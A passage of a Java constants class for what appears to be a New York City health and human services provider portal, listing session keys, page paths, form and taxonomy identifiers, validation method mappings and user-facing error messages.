package com.nyc.hhs.constants;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import com.nyc.hhs.service.filenetmanager.p8constants.P8Constants;

/**
 * Common Constant class for entire Application
 */

public class ApplicationConstants
{

	public static final String KEY_SESSION_APPLICATION_MODULE = "app_menu_name";
	public static final String MODULE_APPLICATION = "header_application";
	public static final String MODULE_DOCUMENT_VAULT = "header_document_vault";
	public static final String MODULE_ORGANIZATION_INFORMATION = "header_organization_information";

	public static final String FORM_CONFIG_FILE_PATH = "/com/nyc/hhs/config/FormConfiguration.xml";
	public static final String NAVIGATION_FILE_PATH = "/com/nyc/hhs/config/navigation.xml";
	public static final String FORM_ID = "formid";
	public static final String SECTION = "asSection";
	public static final String LIVE_VERSION = "liveversion";
	public static final String VERSION_NO = "no";
	public static final String FORM_DEPLOYED_LOCATION = "deployedlocation";

	public static final String LOCAL_SQL_CONFIG = "com/nyc/hhs/config/BatchSqlMapConfig.xml";
	public static final String DOM_FOR_EDIT = "Dom_For_Edit";
	public static final String COMMA = ",";
	public static final String TILD = "~";
	public static final String DB_SELECT = "SELECT * FROM ";
	public static final String FB_TAG = "fb_";
	public static final String SHOW_QUESTION = "showquestion";
	public static final String SAVE_QUESTION = "save";
	public static final String SAVE_QUESTION_SHOW_DOCUMENT = "save_next";
	public static final String TRANSACTION_ELEMENT = "transaction";
	public static final String TAXONOMY_ELEMENT = "taxonomy";
	public static final String VALIDATION_CACHE_REF = "validationRule";
	public static final String DEPENDENCY_CACHE_REF = "dependencyRule";
	public static final String MYBATIS_SESSION = "aoMyBatisSession";
	public static final String FILENET_SESSION = "aoFilenetSession";
	public static final String FILENETDOCTYPE = "filenetdoctype";
	public static final String LANGUAGE_ERROR_OTHERS = "You must select at least one language. If \"Other\" is selected, you must add at least one Other Language.";

	public static final String SQL_CONFIG = "com/nyc/hhs/config/SqlMapConfig.xml";
	public static final String TRANSACTION_CONFIG = "com/nyc/hhs/config/TransactionConfig.xml";
	public static final String BATCH_TRANSACTION_CONFIG = "/com/nyc/hhs/config/TransactionConfig.xml";
	public static final String CACHE_FILES = "com.nyc.hhs.properties.cache";

	public static final String SQL_XML_NODE = "result";

	public static final String TABLE_MAP = "tableMap";
	public static final String COLUMN_MAP = "columnMap";
	public static final String RETRIEVE_QUESANSWER = "retrieve_questionanswer";
	public static final String ELEMENT_DOC = "loDoc";
	public static final String QUESTION_DOC = "loQuestionDoc";
	public static final String BUIZ_APP_ID = "asBuisAppId";
	public static final String APP_ID = "asAppId";
	public static final String STATUSID = "asStatusId";
	public static final String EMP_ID = "asEmpId";
	public static final String FORM_VERSION = "asFormVersion";
	public static final String FORM_NAME_SMALL_CAPS = "formName";
	public static final String FORM_VALUES = "formValues";
	public static final String FILE_NAME = "fileName";
	public static final String MODIFIED_DATE = "MODIFIED_DATE";
	public static final String FORM_VERSION_SMALL_CAPS = "formVersion";

	public static final String SAVE_QUESANSWER = "save_questionanswer";
	public static final String UPLOAD_KEY_MAP = "UploadKeyMap";
	public static final String USER_ROLES = "UserRoles";
	public static final String VALIDATION_CLASS = "Validation_Class";

	public static final String CHECK_APP = "check_app_for_user";

	public static final String QUESTION_ANSWER_MAPPER = "/com/nyc/hhs/config/QuestionAnswerMapper.xml";
	public static final String QUESTION_ANSWER_MAPPER_BEAN = "/com/nyc/hhs/config/QuestionAnswerMapperBean.xml";
	public static final String APP_ID_PREFIX = "app_";

	public static final String KEY_SESSION_APP_ID = "appid";
	public static final String KEY_BUSINESS_APP_ID = "business_app_id";
	public static final String KEY_SESSION_USER_DETAIL = "userdetails";
	public static final String START_STATUS = "Draft";
	public static final String APPLICATION_INFO_INSERTION = "application_info_insertion";
	public static final String BUSINESS_APPLICATION_SUMMARY_DETAILS = "business_application_summary";
	public static final String KEY_SESSION_APP_STATUS = "application_status";

	public static final String APPID_STRING = "APPLICATION_ID";
	public static final String BUSINESS_APPID_STRING = "BUSINESS_APPLICATION_ID";
	public static final String EMPID_STRING = "USER_ID";
	public static final String FORMVERSION_STRING = "FORM_VERSION";
	public static final String CREATEDBY_STRING = "CREATEDBY";
	public static final String FORM_NAME = "FORM_NAME";
	public static final String ORGANIZATIONID = "ORGANIZATION_ID";
	public static final String ORGANIZATION_LEGAL_NAME = "Organization Legal Name - Update Request";
	public static final String ORGANIZATION_LEGAL_NAME_REQUEST = "Organization Legal Name Change";
	public static final String SECTION_ID = "SECTION_ID";
	public static final String STATUS_ID = "STATUS_ID";
	public static final String SECTION_CREATED_DATE = "CREATED_DATE";
	public static final String SECTION_MODIFIED_DATE = "MODIFIED_DATE";
	public static final String SECTION_CREATED_BY = "CREATED_BY";
	public static final String SECTION_MODIFIED_BY = "MODIFIED_BY";
	public static final String FORM_COLUMNS_NON_ORGANIZATION = "ORGANIZATION_ID,FORM_NAME,FORM_VERSION,BUSINESS_APPLICATION_ID,SECTION_ID,USER_ID,STATUS_ID,FORM_ID,CREATED_DATE,MODIFIED_DATE,CREATED_BY,MODIFIED_BY,";
	public static final String FORM_COLUMNS_ORGANIZATION = "ORGANIZATION_ID,FORM_NAME,FORM_VERSION,SECTION_ID,USER_ID,STATUS_ID,FORM_ID,CREATED_DATE,MODIFIED_DATE,CREATED_BY,MODIFIED_BY,";
	public static final String RETRIEVE_FORMINFO = "retrieve_forminfo";
	public static final String APPLICATION_STATUS = "SUBMITTED";

	public static final String KEY_SESSION_USER_ID = "userId";
	public static final String KEY_SESSION_USER_NAME = "userName";
	public static final String KEY_SESSION_USER_VALIDATED = "userValidated";
	public static final String SUCCESS = "success";
	public static final String KEY_SESSION_USER_ROLE = "role";
	
	public static final String KEY_SESSION_USER_PERMISSION_LEVEL = "permissionLevel";
	public static final String KEY_SESSION_USER_PERMISSION_TYPE = "permissionType";
	public static final String KEY_SESSION_USER_ORG = "user_organization";
	public static final String KEY_SESSION_ORG_TYPE = "org_type";
	public static final String KEY_SESSION_ORG_NAME = "org_name";
	public static final String KEY_SESSION_ORG_NAME_CITY = "org_name_for_city";
	public static final String KEY_SESSION_LOGIN_ID = "login_id";
	public static final String KEY_SESSION_EMAIL_ID = "email_id";
	public static final String ROLES = "roles";
	public static final String TRUE = "true";
	public static final String FALSE = "false";
	public static final String NO = "no";
	public static final String SYSTEM_NO = "No";
	public static final String SYSTEM_YES = "Yes";

	public static final String BASIC_PAGE = "/portlet/application/basic_jsr/basic/basic.jsp";
	public static final String HOME_PAGE = "/WEB-INF/jsp/businessapplication/home.jsp";
	public static final String LOGIN_PORTLET = "/portlet/login/loginportlet/loginportlet.jsp";
	public static final String UPLOAD_FILE = "uploadfile";
	public static final String UPLOAD_NEW_FILE_VERSION = "uploadnewversion";
	public static final String VIEW_DOCUMENT = "viewdocumentinfo";
	public static final String EDIT_DOCUMENT = "editdocumentprops";
	public static final String EDIT_CITY_DOCUMENT = "acceditdocumentprop";
	public static final String VIEW_HISTORY = "viewversionhistory";
	public static final String DISPLAY_FILE = "displayfileinfo";
	public static final String PROV_DOCUMENT_LIST_PAGE = "provdocumentlist";
	public static final String ACC_DOCUMENT_LIST_PAGE = "accdocumentlist";
	public static final String UPLOAD_FILE_PAGE = "/WEB-INF/jsp/businessapplication/uploadfileBapp.jsp";
	public static final String DISPLAY_FILE_INFO_PAGE = "/WEB-INF/jsp/businessapplication/displayfileinfoBapp.jsp";
	public static final String DOCUMENT_LIST_PAGE = "/WEB-INF/jsp/businessapplication/documentlistBapp.jsp";
	public static final String SHARE_DOCUMENT_STEP1_PAGE = "sharedocumentstep1";
	public static final String SHARE_DOCUMENT_STEP2_PAGE = "sharedocumentstep2";
	public static final String SHARE_DOCUMENT_STEP3_PAGE = "sharedocumentstep3";
	public static final String SHARE_DOCUMENT_STEP4_PAGE = "sharedocumentstep4";
	public static final String UNSHARE_DOCUMENT = "unshare";
	public static final String UNSHARE_DOCUMENT_BY_PROVIDER = "unsharebyprovider";
	public static final String DISPLAY_SHARED_DOCUMENTS = "displaysharedocuments";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_MENU = "subsectionmenu";
	public static final String USER_DN = "userDN";
	public static final String IS_FORM_WITH_ERROR = "isFormWithError";
	public static final String IS_FOR_UPDATE = "isForUpdate";
	public static final String IS_FROM_PAGE = "isFromPage";
	public static final String FILE_TO_INCLUDE = "fileToInclude";
	public static final String DOM_RETURNED = "loDomReturn";
	public static final String FOR_UPDATE = "forUpdate";
	public static final String NEXT_ACTION = "next_action";
	public static final String SEND_TO_TLD = "lsToSend";

	public static final String HELP = "help";
	public static final String QUESTION = "question";
	public static final String ANSWER = "answer";

	/* FAQ Preview and help page */
	public static final String FAQ_PREVIEW_DISPLAY = "faq_preview_display";
	public static final String FAQ_DISPLAY_PUBLISH = "faq_publish";
	public static final String FAQ_HELP_DISPLAY = "faq_help_display";

	public static final String CONTACT_US = "ContactView";
	public static final String TOPIC_LIST = "topic_list";
	public static final String GET_CONTACT_US_ID_FILENET = "getContactUsIDFilenet";
	public static final String LAUNCH_WORKFLOW_CONTACT_US = "launchWorkflowWF08";
	public static final String LAUNCH_WORKFLOW_ORG_ACCOUNT_CREATE = "launchWorkflowWF04";

	public static final String APPID = "asAppId";
	public static final String USER_ID = "asUserID";
	public static final String CREATED_BY = "aoCreatedBy";
	public static final String CREATED_DATE = "aoCreatedDate";
	public static final String UPDATED_BY = "aoUpdatedBy";
	public static final String UPDATED_DATE = "aoUpdatedDate";
	public static final String STATUS = "asStatus";
	public static final String ORG_ID = "asOrgId";
	public static final String BUSINESS_APP_ID = "asBusinessAppId";

	public static final String QUES_PATH = "asQuestionPath";
	public static final String BUSINESS_RULE_XML_PATH = "asBusinessRulePath";
	public static final String TEMPLATE_PATH = "asFormTemplatePath";
	public static final String PARAMS = "aoParameters";
	public static final String USER_ROLE = "asUserRoles";
	public static final String VALIDATE_CLASS = "asValidationClass";
	public static final String DATA_FLAG = "asDataFlag";
	public static final String FORMNAME = "asFormName";
	public static final String ELEMENT_PATH = "asFormElementPath";
	public static final String USERID = "asUserID";
	public static final String COLUMN = "COLUMN";
	public static final String VALUES_FOR_COLUMN = "VALUESFORCOLUMN";

	public static final String CITY = "city";
	public static final String CITY_TYPE = "City";
	public static final String PROVIDER = "provider";
	public static final String AGENCY = "agency";
	public static final String ERROR_MSSG = "errorMsg";
	public static final String INVALID_LOGIN = "Invalid Login";
	public static final String INDEX = "index";
	public static final String ERROR_PAGE = "errorpage";
	public static final String ACCELERATOR = "Accelerator";
	public static final String BOTH_AGENCY_PROVIDER = "both";

	public static final String ANSWER_BEAN = "loAnswerBean";
	public static final String DEPLOYED_FORM_NAME = "HHSFile";

	public static final String LINE_ELT = "lineElt";
	public static final String EMPTY_STRING = "";
	public static final String QUOTE_COMMA_QUOTE = "','";

	// Upload file Controller
	public static final String APPLICATION_ID = "applicationid";
	public static final String DB = "DB";
	public static final String DOCUMENT_LIST = "documentlist";
	public static final String DOC_TYPE = "docType";
	public static final String DOC_CATEGORY = "docCategory";
	public static final String DOC_ID = "docId";
	public static final String REQ_PROPS = "hmReqProps";
	public static final String DOCUMENT_MAP = "documentMap";

	public static final String VALUE = "value";
	public static final String ERROR_CODE = "errorcode";

	public static final String PORTAL_URL = "/portal/hhsweb.portal?_nfpb=true&_nfls=false";
	
	/* QC9713 */
    public static final String LOGOUT_REDIRECT_URL = "/portal/hhsweb.portal?_nfpb=true&_pageLabel=portlet_hhsweb_portal_login_page&_nfls=false&logout=logout";

	public static final String DATE_FORMAT = "MM/dd/yyyy";

	public static final String RETRIEVE_FROM_TAXONOMY = "retrieve_from_taxonomy";

	// Document Vault
	public static final String PROVIDER_ORG = "provider_org";
	public static final String CITY_ORG = "city_org";
	public static final String AGENCY_ORG = "agency_org";
	public static final String ROLE_STAFF = "staff";
	public static final String ROLE_MANAGER = "manager";
	public static final String ROLE_EXECUTIVE = "executive";
	public static final String ROLE_ADMINISTRATOR_PROV_STAFF = "providerAdminStaff";
	public static final String ROLE_ADMINISTRATOR_PROV_MANAGER = "ProviderAdminManager";

	public static final String SHOW_POPULATION = "showPopulation";
	public static final String TAXONOMY_TYPE = "asTaxonomyType";
	public static final String POPULATION = "population";
	public static final String GET_BASIC_POPULATION_DATA = "BasicPopulationView";
	public static final String SET_BASIC_POPULATION_DATA = "BasicPopulationViewSave";
	public static final String FROM_CACHE = "abFromCache";
	public static final String ORGANIZATION_ID = "asOrgId";
	public static final String OTHER_POPULATION = "asOther";
	public static final String OTHER_POPULATION_CHECKBOX = "asOtherCheckbox";
	public static final String SAVE_POPULATION = "savePopulation";
	public static final String SAVE_AND_NEXT_POPULATION = "saveAndNextPopulation";
	public static final String POPULATION_LIST = "population_list";
	public static final String TAXONOMY_TREE_LIST = "taxonomy_tree_list";
	public static final String POPULATION_DATA_LIST = "aoPopulationdatalist";
	public static final List<String> FROM_TO_AGE_LIST = Arrays.asList("Infants", "Children", "Young Adults", "Adults",
			"Aging");// "Newborns",
	public static final String NOERROR_PAGE_STATUS = "noerrors";
	public static final String ERROR_PAGE_STATUS = "errors";
	public static final String FROM_AGE = "fromage_";
	public static final String TO_AGE = "toage_";
	public static final String CHECK_NUMERIC_TYPE = "-?\\d+(.\\d+)?";
	public static final String POPULATION_NODE = "POPULATION";
	public static final String SHOW_LANGUAGE = "showLanguage";
	public static final String SELECT_FROM_DB = "ServiceSelectionView";
	public static final String SERVICE_AREA = "SERVICEAREA";
	public static final String ELEMENT_TYPE = "asElementType";

	/********** ERROR MESSAGES STARTS ************/
	public static final String FIELD_REQUIRED = "! This field is required.";
	public static final String AGE_VALUE_TYPE = "Age range value is string. Please enter a numeric value.";
	public static final String TO_AGE_VALUE_TYPE = "To age value is string.Please enter numeric value.";
	public static final String NO_POPULATION_SELECTED = "You must select at least one population.";
	/********** ERROR MESSAGES ENDS ************/

	public static final String FILENET_CONNECTION_TRANS = "get_filenet_connection";
	public static final String FILENET_SESSION_OBJECT = "P8FilenetSession";
	public static final String DOCUMENT_VAULT_NEXT_ACTION_PARAMETER = "next_action";
	public static final String DOCUMENT_VAULT_CURRENT_PAGE_VALUE_PARAMETER = "currentPage";
	public static final String DOCUMENT_VAULT_NEXT_PAGE_VALUE_PARAMETER = "nextPage";
	public static final String DOCUMENT_VAULT_PARENT_NODE_PARAMETER = "parentNode";
	public static final String DOCUMENT_VAULT_SORT_BY_PARAMETER = "sortBy";
	public static final String DOCUMENT_VAULT_SORT_TYPE_PARAMETER = "sortType";
	public static final String DOCUMENT_VAULT_DOC_CATEGORY_REQ_PARAMETER = "docCategory";
	public static final String DOCUMENT_VAULT_DOCUMENT_PARAMETER = "document";
	public static final String DOCUMENT_VAULT_DOCUMENT_LIST_PARAMETER = "documentList";

	public static final String PROPERTY_ERROR_CODE = "ERROR_CODE";

	public static final String ERROR_MESSAGE_PROP_FILE = "com.nyc.hhs.properties.errormessages";
	public static final String BA_FACTORY_PROP_FILE = "com.nyc.hhs.properties.businessapplicationfactory";
	public static final String SERVICE_PRINT_PROP_FILE = "com.nyc.hhs.properties.serviceprintquesionmapping";

	// Business Application Constants
	public static final String BUSINESS_APPLICATION_SECTION_BASICS = "basics";
	public static final String BUSINESS_APPLICATION_SECTION_FILINGS = "filings";
	public static final String BUSINESS_APPLICATION_SECTION_BOARD = "board";
	public static final String BUSINESS_APPLICATION_SECTION_POLICIES = "policies";
	public static final String BUSINESS_APPLICATION_SECTION_REVIEW_SUMMARY = "businessapplicationsummary";
	public static final String BUSINESS_APPLICATION_SECTION_SERVICE_SUMMARY = "servicesummary";

	public static final String BUZ_APP_SUB_SECTION_QUESTION = "questions";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DOCUMENTS = "documentlist";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_GEOGRAPHY = "geography";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_LANGUAGES = "languages";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_POPULATIONS = "populations";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APPLICATION_SUMMARY = "application_summary";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ADD_SERVICE = "add_service";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_HOME = "service_home";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_PRINTER_FRIENDLY = "printfriendly";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_ORG_LEGAL_NAME = "newLegalName";
	public static final String BUSINESS_APPLICATION_ACTION = "next_action";
	public static final String BUSINESS_APPLICATION_ACTION_SAVE = "save";
	public static final String BUSINESS_APPLICATION_ACTION_SAVE_NEXT = "save_next";
	public static final String BUSINESS_APPLICATION_ACTION_BACK = "back";
	public static final String BUSINESS_APPLICATION_ACTION_OPEN = "open";

	public static final String BUZ_APP_PARAMETER_SECTION = "section";
	public static final String BUZ_APP_PARAMETER_SUB_SECTION = "subsection";
	public static final String BUSINESS_APPLICATION_SESSION_PARAMETER_TAXONOMY = "TAXONOMYLIST";
	public static final String BUSINESS_APPLICATION_TABLE_NAME = "asTableName";
	/* Business Application ends */

	public static final String RETRIEVE_TAXONOMYINFO = "retrieveTaxonomyInfo";
	public static final String GET_BASIC_LANGUAGE_DATA = "BasicLanguageView";
	public static final String BASIC_LANGUAGE_SAVE = "basicLanguageSave";
	public static final String OPEN_PAGE = "openPage";
	public static final String LANGUAGE = "language";
	public static final String LANGUAGE_NODE = "LANGUAGE";
	public static final List<String> CHECKBOX_LANGUAGE_DISPLAYED = Arrays.asList("American Sign Language", "Chinese",
			"English", "Haitian", "Creole", "Interpreter Services", "Italian", "Korean", "Russian", "Spanish");

	public static final String DOCUMENT_VERSION_LIST_PARAMETER = "documentVersionList";

	/* Start code for document vault */
	public static final String SELECT_DOC_FROM_VAULT = "/WEB-INF/jsp/businessapplication/selDocFromVaultBapp.jsp";
	public static final String FROM_AGE_VALUE_TYPE = "";
	public static final String DISPLAY_DOC_LIST_FILENET = "displayDocList_filenet";

	// added by varun
	public static final String FORM_RULES_NODE = "form-rules";
	public static final String FORM_RULE_NODE = "form-rule";
	public static final String DEPENDENCY_RULE_NODE = "dependency-rule";
	public static final String TRIGGER_NODE = "trigger";
	public static final String RULE_NODE = "rule";
	public static final String RULES_NODE = "rules";
	public static final String DEPENDENT_NODE = "dependent";
	public static final String DEPENDENT_ON_NODE = "dependent-on";
	public static final String QUESTION_NODE = "question";
	public static final String DOC_MAPPING_NODE = "doc-mapping";
	public static final String DOC_TYPE_NODE = "doctype";
	public static final String DOCS_TYPE_NODE = "doctypes";
	public static final String CATEGORY_NODE = "category";
	public static final String ELEMENT_NODE = "element";
	public static final String MANDATORY_NODE = "mandatory";
	public static final String PATTERN_NODE = "pattern";
	public static final String SPECIAL_CHARS_NODE = "allowedSpecialChar";
	public static final String MAX_LENGTH_NODE = "maxLength";
	public static final String MIN_LENGTH_NODE = "minLength";
	public static final String VALIDATION_UTIL_CLASS = "com.nyc.hhs.util.ValidationUtil";
	public static final Map<String, String> VALIDATION_METHOD_MAP = new HashMap<String, String>();
	static
	{
		VALIDATION_METHOD_MAP.put(PATTERN_NODE, "checkPattern");
		VALIDATION_METHOD_MAP.put(SPECIAL_CHARS_NODE, "checkSpecialChar");
		VALIDATION_METHOD_MAP.put(MAX_LENGTH_NODE, "checkMaxLength");
		VALIDATION_METHOD_MAP.put(MIN_LENGTH_NODE, "checkMinLength");
		VALIDATION_METHOD_MAP.put(MANDATORY_NODE, "checkMandatory");
	}
	public static final Map<String, String> TAXONOMY_TYPE_MAP = new HashMap<String, String>();
	static
	{
		TAXONOMY_TYPE_MAP.put(BUSINESS_APPLICATION_SUB_SECTION_LANGUAGES, "Languages");
		TAXONOMY_TYPE_MAP.put(BUSINESS_APPLICATION_SUB_SECTION_GEOGRAPHY, "Geography");
		TAXONOMY_TYPE_MAP.put(ApplicationConstants.POPULATION, "Populations");
		TAXONOMY_TYPE_MAP.put("SERVICEAREA", "Service Area");
		TAXONOMY_TYPE_MAP.put(ApplicationConstants.SERVICE_SETTING, "Service Setting");
	}

	/********************** Constants for taxonomy services ****************************/
	/** String variable to hold the selected services constant */
	public static final String INSERT_UPDATE_DELETE_EXECUTION = "aoInsertUpdateDeleteExecution";

	/** String variable to hold the selected services list constant */
	public static final String SAVE_SERVICES_LIST = "aoSelectedServiceList";

	/** String variable to hold the organization id constant */
	public static final String NEW_ORGANIZATION_ID = "asOrgId";

	/** String variable to hold the findSaveServices constant */
	public static final String FIND_SAVE_SERVICES = "getSelectedService";

	/** String variable to hold the selected services constant */
	public static final String DELETE_SELECTED_SERVICES = "deleteSelectedService";

	/** String variable to hold the selected services list constant */
	public static final String INSERT_UPDATE_DELETE_MAP = "loInsertUpdateDeleteMap";

	/** String variable to hold the loBusinessApplicationId constant */
	public static final String BUSINESS_APPLICATION_ID = "loBusinessApplicationId";

	/** String variable to hold the loServiceElementId constant */
	public static final String SERVICE_ELEMENT_ID = "loServiceElementId";

	/** String variable to hold the loServiceListDB constant */
	public static final String SERVICE_LIST_DB = "loServiceListDB";
	public static final String ERROR_HANDLER = "/portlet/application/documentvault/errorHandler.jsp";
	public static final String ERROR_HANDLER1 = "errorHandler1";
	public static final String MESSAGE_M52 = "M52";
	public static final String MESSAGE_M500 = "M500";
	public static final String MESSAGE_M51 = "M51";
	public static final String MESSAGE_M13 = "M13";
	public static final String MESSAGE_M112 = "M112";
	public static final String SESSION_DOCUMENT_OBJ = "documentObj";
	public static final String DOCUMENT_PROP_HM = "documentPropHM";
	public static final String DOCUMENT_ID = "documentId";
	public static final String ERROR_MESSAGE = "message";
	public static final String ERROR_MESSAGE_TYPE = "messageType";
	public static final String ERROR_INFORMATION = "information";
	public static final String SESSION_DOCUMENT_LIST = "documentList";
	public static final String RENDER_ACTION = "action";
	public static final String ACTION = "action";
	public static final String SHARE_DOCUMENT_LIST = "shareDocumentList";

	public static final String FORMS_FOLDER_NAME = "forms";
	public static final String BUSINESS_RULE_XML = "/businessRule.xml";

	public static final String MESSAGE_PASS_TYPE = "passed";
	public static final String MESSAGE_FAIL_TYPE = "failed";

	public static final String RETRIEVE_APPLICATION_SUMMARY = "applicationSummary";
	public static final String SHOW_SUMMARY = "showsummary";
	public static final String SHOW_TERMS = "termscondition";
	public static final String KEY_SESSION_ORG_ID = "asOrgId";

	/* Maintenance Application Constants */
	public static final String MAINTENANCE_PAGE = "/portlet/maintenance/faqmaintenance/landingfaq.jsp";
	public static final String MAINTENANCE_MANAGE_FAQ = "/portlet/maintenance/faqmaintenance/managefaq.jsp";
	public static final String MAINTENANCE_UPDATE_FAQ = "/portlet/maintenance/faqmaintenance/updatefaq.jsp";
	public static final String MAINTENANCE_USER_TYPE = "userType";

	public static final String APP_STATUS_DRAFT = "Draft";
	public static final String APP_STATUS_RETURNED = "returned";
	public static final String APP_STATUS_DEFERRED = "deferred";

	public static final String FIRST_ACTION = "start";

	public static final String MAINTENANCE_TAXONOMY_ITEM_MAIN = "mainttaxonomymain";
	public static final String MAINTENANCE_TAXONOMY_ITEM_DETAILS = "mainttaxonomyitemdetail";

	public static final String LOGIN_PAGE = "/portlet/login/loginportlet/loginportlet.jsp";

	/************************************ Constant Values Created By Megha *************************/

	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_ORG_ID = "org_id";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_ID = "appid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_USER_ID = "user_id";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_CREATED_BY = "createdby";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_CREATED_DATE = "createddate";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_UPDATED_BY = "updatedby";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_UPDATED_DATE = "updateddate";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_SERVICE_INSERT_OTHER_DATA = "insertOtherData";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_SERVICE = "service";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_BUSINESS = "Business";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_DRAFT = "Draft";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_IN_REVIEW = "In Review";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_TABLE_NAME = "tablename";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_MAP_ELEMENTS = "mapelements";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_SCHEMA_NAME = "schemaname";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_COLUMN_NAME = "columnname";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_FORM_TEMPLATE = "formtemplate";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_NAME = "name";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_ERROR_CODE = "errorcode";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_SELECT = "select";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_FILE = "file";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_PATH = "path";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_TABLE_MAP = "tableMap";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_SERVICE_GLOBAL_PROPERTY = "globalproperty";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_ID = "id";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_NAME = "name";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_TYPE = "type";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_BRANCH_ID = "branchid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_PARENT_ID = "parentid";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_EVIDENCE_REQUIRED_FLAG = "evidencerequiredflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_ACTIVE_FLAG = "activeflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_SELECTION_FLAG = "selectionflag";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_INSERT = "insert";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_DELETE = "delete";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_SERVICE_UPDATE = "update";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_WORKFLOW_SERVICE_SELECTION_ID = "SectionID";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_WORKFLOW_SERVICE_PROVIDER_NAME = "ProviderName";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_DAO_DOC_ID = "DocId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_DAO_USER_NAME = "username";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_DAO_OTHER_DATA = "otherdata";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_DAO_AS_ELEMENT_ID = "asElementId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_APP_DAO_AS_ELEMENT_TYPE = "asElementType";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_AS_ORG_ID = "asOrgId";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_AS_FORM_NAME = "asFormName";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_AS_FORM_VERSION = "asFormVersion";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_TABLE = "TABLE";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_QUESTION_ANSWER_DAO_VALUES_TO_UPDATE = "VALUESTOUPDATE";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_SECTION_DAO_HM_SUB_SECTION = "aoHMSubSection";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SECTION_DAO_HM_DOCUMENT = "aoHMDocument";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SECTION_DAO_HMBR_APP = "aoHMBRApplication";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_SECTION_DAO_HM_SECTION = "aoHMSection";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_TASK_HISTORY_DAO_APP_AUDIT = "aoApplicationAudit";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DAO_BUSINESS_APP_ID = "aoBusinessApplicationId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DAO_SERVICE_ELEMENT_ID = "aoServiceElementId";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DAO_MODIFIED_BY = "aoModifiedBy";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DAO_MODIFIED_DATE = "aoModifiedDate";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_BOTTOM_CHECK_BOX = "asBottomCheckBox";

	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_ELEMENT = "element";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_ID = "id";
	public static final String BUSINESS_APPLICATION_SUB_SECTION_TAXONOMY_DOM_NAME = "name";
